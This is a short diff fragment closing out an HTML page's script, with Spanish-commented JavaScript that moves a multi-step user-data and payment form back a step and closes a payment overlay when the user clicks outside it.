+            // Actualizar pasos
+            if (currentFormId === 'user-data-form') {
+                document.getElementById('step-2').classList.remove('active');
+                document.getElementById('step-1').classList.remove('completed');
+                document.getElementById('step-1').classList.add('active');
+            } else if (currentFormId === 'payment-info') {
+                document.getElementById('step-3').classList.remove('active');
+                document.getElementById('step-2').classList.remove('completed');
+                document.getElementById('step-2').classList.add('active');
+            }
+        }
+        
+        // Cerrar overlay al hacer clic fuera
+        document.getElementById('payment-overlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                hidePaymentData();
+            }
+        });
+    </script>
+</body>
+</html>
